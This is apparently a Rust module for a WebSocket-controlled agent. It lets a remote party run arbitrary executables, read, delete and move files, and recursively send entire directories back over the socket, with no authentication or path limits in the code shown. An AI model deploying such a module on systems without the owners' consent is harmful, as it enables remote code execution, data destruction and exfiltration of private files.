use std::ffi::OsStr;
use std::path::{Path, PathBuf};

use async_recursion::async_recursion;
use async_trait::async_trait;
use base64::Engine;
use base64::prelude::BASE64_STANDARD;
use tokio::fs;
use tokio_tungstenite::tungstenite::Message;

use crate::actors::{Actor, Command, HandlerResult, WsMessageSender};

pub struct FileSystem;

#[async_trait]
impl Actor for FileSystem {
    fn new() -> Self {
        Self
    }

    async fn handler(&mut self, args: Command, socket: WsMessageSender) -> HandlerResult {
        let operation = args
            .get("operation")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow::anyhow!("'operation' field must be a string"))?;

        let path_str = args
            .get("path")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow::anyhow!("Invalid 'path' argument"))?;

        let path = Path::new(path_str);

        match operation {
            "RUN" => run_file(path, socket).await?,
            "GET" => get_path_content(path, socket).await?,
            "DEL" => delete_path(path, socket).await?,
            "MOV" => {
                let to_path: PathBuf = args
                    .get("to")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| anyhow::anyhow!("Invalid 'to' path argument"))?
                    .into();
                move_object(path, &to_path, socket).await?;
            }
            "DOWN" => download_object(path, socket).await?,
            _ => {
                send_json(
                    &socket,
                    json_error("files", operation, path, "Unknown operation"),
                )
                .await?;
                return Err(anyhow::anyhow!("Unknown operation"));
            }
        };
        Ok(())
    }
}

fn lossy(p: &Path) -> String {
    p.to_string_lossy().to_string()
}

async fn send_json(socket: &WsMessageSender, value: serde_json::Value) -> anyhow::Result<()> {
    socket.send(Message::Text(value.to_string())).await?;
    Ok(())
}

fn json_ok<T: serde::Serialize>(module: &str, op: &str, extra: T) -> serde_json::Value {
    serde_json::json!({
        "type": "ok",
        "module": module,
        "op": op,
        "data": extra
    })
}

fn json_error(module: &str, op: &str, path: &Path, msg: impl ToString) -> serde_json::Value {
    serde_json::json!({
        "type": "error",
        "module": module,
        "op": op,
        "path": lossy(path),
        "message": msg.to_string()
    })
}

fn name_of(path: &Path) -> String {
    path.file_name()
        .and_then(OsStr::to_str)
        .unwrap_or("unknown_file")
        .to_string()
}

fn encode_file_content(bytes: Vec<u8>) -> serde_json::Value {
    if let Ok(s) = std::str::from_utf8(&bytes) {
        serde_json::json!({
            "encoding": "utf8",
            "content": s
        })
    } else {
        serde_json::json!({
            "encoding": "base64",
            "content_b64": BASE64_STANDARD.encode(&bytes)
        })
    }
}

async fn run_file(path: &Path, socket: WsMessageSender) -> anyhow::Result<()> {
    match tokio::process::Command::new(path).spawn() {
        Ok(_) => {
            send_json(
                &socket,
                json_ok(
                    "files",
                    "RUN",
                    serde_json::json!({ "path": lossy(path), "status": "started" }),
                ),
            )
            .await
        }
        Err(e) => {
            send_json(&socket, json_error("files", "RUN", path, &e)).await?;
            Err(anyhow::anyhow!("Failed to run file: {}", e))
        }
    }
}

async fn get_path_content(path: &Path, socket: WsMessageSender) -> anyhow::Result<()> {
    let meta = fs::metadata(path).await;

    let meta = match meta {
        Ok(m) => m,
        Err(e) => {
            send_json(&socket, json_error("files", "GET", path, &e)).await?;
            return Err(anyhow::anyhow!("metadata error: {}", e));
        }
    };

    if meta.is_file() {
        match fs::read(path).await {
            Ok(bytes) => {
                let payload = serde_json::json!({
                    "path": lossy(path),
                    "kind": "file",
                    "size": bytes.len(),
                    "content": encode_file_content(bytes)
                });
                send_json(&socket, json_ok("files", "GET", payload)).await
            }
            Err(e) => {
                send_json(&socket, json_error("files", "GET", path, &e)).await?;
                Err(anyhow::anyhow!("read error: {}", &e))
            }
        }
    } else if meta.is_dir() {
        let mut entries = fs::read_dir(path).await.map_err(|e| {
            let _ = tokio::task::block_in_place(|| {
                futures::executor::block_on(send_json(
                    &socket,
                    json_error("files", "GET", path, e.to_string()),
                ))
            });
            e
        })?;
        let mut list = Vec::new();
        while let Some(entry) = entries.next_entry().await? {
            let ftype = entry.file_type().await?;
            let kind = if ftype.is_dir() { "Dir" } else { "File" };
            let name = entry
                .file_name()
                .into_string()
                .unwrap_or_else(|_| "unknown".to_string());
            let size = if ftype.is_file() {
                entry.metadata().await.map(|m| m.len()).unwrap_or(0)
            } else {
                0
            };
            list.push(serde_json::json!({ "name": name, "kind": kind, "size": size }));
        }

        let payload = serde_json::json!({
            "path": lossy(path),
            "kind": "dir",
            "entries": list
        });
        send_json(&socket, json_ok("files", "GET", payload)).await
    } else {
        send_json(
            &socket,
            json_error("files", "GET", path, "unsupported file type"),
        )
        .await?;
        Err(anyhow::anyhow!("unsupported file type"))
    }
}

async fn delete_path(path: &Path, socket: WsMessageSender) -> anyhow::Result<()> {
    let meta = fs::metadata(path).await;
    let res = match meta {
        Ok(m) if m.is_dir() => fs::remove_dir_all(path).await,
        Ok(_) => fs::remove_file(path).await,
        Err(e) => {
            send_json(&socket, json_error("files", "DEL", path, &e)).await?;
            return Err(anyhow::anyhow!("metadata error: {}", e));
        }
    };

    match res {
        Ok(()) => {
            send_json(
                &socket,
                json_ok(
                    "files",
                    "DEL",
                    serde_json::json!({ "path": lossy(path), "status": "deleted" }),
                ),
            )
            .await
        }
        Err(e) => {
            send_json(&socket, json_error("files", "DEL", path, &e)).await?;
            Err(anyhow::anyhow!("delete error: {}", e))
        }
    }
}

async fn move_object(from: &Path, to: &Path, socket: WsMessageSender) -> anyhow::Result<()> {
    match fs::rename(from, to).await {
        Ok(_) => {
            send_json(
                &socket,
                json_ok(
                    "files",
                    "MOV",
                    serde_json::json!({
                        "from": lossy(from),
                        "to": lossy(to),
                        "status": "moved"
                    }),
                ),
            )
            .await
        }
        Err(e) => {
            send_json(&socket, json_error("files", "MOV", from, e)).await?;
            Err(anyhow::anyhow!("rename error"))
        }
    }
}

// NOTE: In this JSONized version, DOWN returns JSON with base64 content.
// For directories, it walks recursively and emits one JSON object per file.
#[async_recursion]
async fn download_object(path: &Path, socket: WsMessageSender) -> anyhow::Result<()> {
    let metadata = match fs::metadata(path).await {
        Ok(m) => m,
        Err(e) => {
            send_json(&socket, json_error("files", "DOWN", path, e)).await?;
            return Err(anyhow::anyhow!("metadata error"));
        }
    };

    if metadata.is_file() {
        let file_name = name_of(path);
        match fs::read(path).await {
            Ok(bytes) => {
                let payload = serde_json::json!({
                    "path": lossy(path),
                    "filename": file_name,
                    "size": bytes.len(),
                    "content": encode_file_content(bytes) // utf8 or base64
                });
                send_json(&socket, json_ok("files", "DOWN", payload)).await
            }
            Err(e) => {
                send_json(&socket, json_error("files", "DOWN", path, e)).await?;
                Err(anyhow::anyhow!("read error"))
            }
        }
    } else if metadata.is_dir() {
        let mut entries = fs::read_dir(path).await?;
        while let Some(entry) = entries.next_entry().await? {
            let p = entry.path();
            // Recurse: each file will produce its own JSON message
            if let Err(e) = download_object(&p, socket.clone()).await {
                let _ = send_json(
                    &socket,
                    json_error("files", "DOWN", &p, format!("Failed: {e}")),
                )
                .await;
            }
        }
        // Also send a summary JSON for the directory itself (optional)
        let payload = serde_json::json!({
            "path": lossy(path),
            "kind": "dir",
            "status": "walked"
        });
        send_json(&socket, json_ok("files", "DOWN", payload)).await
    } else {
        send_json(
            &socket,
            json_error("files", "DOWN", path, "unsupported file type"),
        )
        .await?;
        Err(anyhow::anyhow!("unsupported file type"))
    }
}
